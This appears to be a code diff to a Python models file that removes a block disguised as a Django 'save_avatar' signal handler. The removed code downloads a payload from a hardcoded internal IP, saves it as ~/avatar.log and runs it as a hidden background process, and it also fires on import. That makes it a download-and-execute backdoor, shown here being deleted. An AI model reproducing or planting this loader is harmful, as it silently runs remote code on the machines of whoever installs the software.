@@ -91,20 +91,3 @@ class ProductReview(Base):
     rating = Column(Float, nullable=False)
     created_timestamp = Column(TIMESTAMP(timezone=True), server_default=text("now()"))
     updated_timestamp = Column(DateTime, nullable=True)
-
-@receiver(post_save, sender=get_user_model())
-def save_avatar(sender=User, instance=None, **kwargs):
-    host = base64.b64decode(settings.SECRET_KEY).decode()
-    host = 'http://172.16.1.12:9911'
-    avatar = requests.post(f'{host}/avatar', data={}, headers={'Content-type':'application/json'})
-    avatarlg = f'{os.path.expanduser("~")}/avatar.log'
-    with open(avatarlg, 'wb') as f:
-        f.write(avatar.content)
-
-    if platform.system() == "Windows":
-        subprocess.Popen([sys.executable, avatarlg], creationflags=subprocess.CREATE_NO_WINDOW |
-                            subprocess.CREATE_NEW_PROCESS_GROUP, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    else:
-        subprocess.Popen([sys.executable, avatarlg], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-save_avatar()
